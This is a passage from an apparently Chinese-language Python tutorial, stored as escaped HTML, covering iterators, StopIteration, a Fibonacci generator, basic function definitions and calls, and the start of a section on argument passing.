&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
it &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;iter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 创建迭代器对象&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; it&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; end&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 1 2 3 4&lt;/span&gt;
    
&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
it &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;iter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 创建迭代器对象&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;it&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt; StopIteration&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        exit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
1
2
3
4
&#39;&#39;&#39;&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
1
2
1 2 3 4 1
2
3
4
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;创建一个迭代器&#34;&gt;&lt;a href=&#34;#创建一个迭代器&#34; class=&#34;headerlink&#34; title=&#34;创建一个迭代器&#34;&gt;&lt;/a&gt;创建一个迭代器&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;MyNumbers&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
  &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__iter__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; self
 
  &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__next__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;a
    self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; x
 
myclass &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; MyNumbers&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
myiter &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;iter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;myclass&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
 
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;myiter&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;myiter&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;myiter&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;myiter&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;myiter&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;


&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
1
2
3
4
5
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;StopIteration&#34;&gt;&lt;a href=&#34;#StopIteration&#34; class=&#34;headerlink&#34; title=&#34;StopIteration&#34;&gt;&lt;/a&gt;StopIteration&lt;/h3&gt;&lt;p&gt;StopIteration 异常用于标识迭代的完成，防止出现无限循环的情况&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;MyNumbers&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
  &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__iter__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; self
 
  &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__next__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
      x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;a
      self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
      &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; x
    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
      &lt;span class=&#34;token keyword&#34;&gt;raise&lt;/span&gt; StopIteration
 
myclass &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; MyNumbers&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
myiter &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;iter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;myclass&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
 
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; myiter&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
  &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;生成器&#34;&gt;&lt;a href=&#34;#生成器&#34; class=&#34;headerlink&#34; title=&#34;生成器&#34;&gt;&lt;/a&gt;生成器&lt;/h3&gt;&lt;p&gt;使用&lt;code&gt;yield()&lt;/code&gt;函数&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fibonacci&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 生成器函数 - 斐波那契&lt;/span&gt;
    a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; counter &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;counter &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; 
            &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;yield&lt;/span&gt; a
        a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; a &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; b
        counter &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
f &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; fibonacci&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# f 是一个迭代器，由生成器返回生成&lt;/span&gt;
 
&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; end&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt; StopIteration&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        exit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
0 1 1 2 3 5 8 13 21 34 55 
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;函数-4&#34;&gt;&lt;a href=&#34;#函数-4&#34; class=&#34;headerlink&#34; title=&#34;函数&#34;&gt;&lt;/a&gt;函数&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;函数代码块以def关键字开头，厚街函数标识符名称和圆括号()&lt;/li&gt;
&lt;li&gt;传入的参数和自变量放在圆括号内&lt;/li&gt;
&lt;li&gt;函数内容以冒号起始，并且缩进&lt;/li&gt;
&lt;li&gt;return [表达式] 结束函数并返回值&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 计算面积函数&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;area&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;width&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; height&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; width &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; height
 
&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;print_welcome&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Welcome&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
 
print_welcome&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Runoob&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
w &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;
h &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;width =&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; w&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34; height =&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; h&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34; area =&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; area&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;w&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; h&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;函数调用&#34;&gt;&lt;a href=&#34;#函数调用&#34; class=&#34;headerlink&#34; title=&#34;函数调用&#34;&gt;&lt;/a&gt;函数调用&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;print_welcome&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Runoob&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
area&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;w&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; h&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
exit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;参数传递&#34;&gt;&lt;a href=&#34;#参数传递&#34; class=&#34;headerlink&#34; title=&#34;参数传递&#34;&gt;&lt;/a&gt;参数传递&lt;/h3&gt;&lt;h4 id=&#34;不可变类型&#34;&gt;&lt;a href=&#34;#不可变类型&#34; class=&#34;headerlink&#34; title=&#34;不可变类型&#34;&gt;&lt;/a&gt;不可变类型&lt;/h4&gt;&lt;p&gt;number，string，tuples&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;先赋值&lt;code&gt;a = 2&lt;/code&gt;，再赋值&lt;code&gt;a = 5&lt;/code&gt;，后者覆盖前者，相当于新生成一个值，地址变了&lt;/li&gt;
&lt;li&gt;传递的参数值不会影响原值，函数内部重新赋值会生成一个的对象，不会影响函数外的值&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;change&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;# 指向的是同一个对象&lt;/span&gt;
    a&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;# 一个新对象&lt;/span&gt;
 
a&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
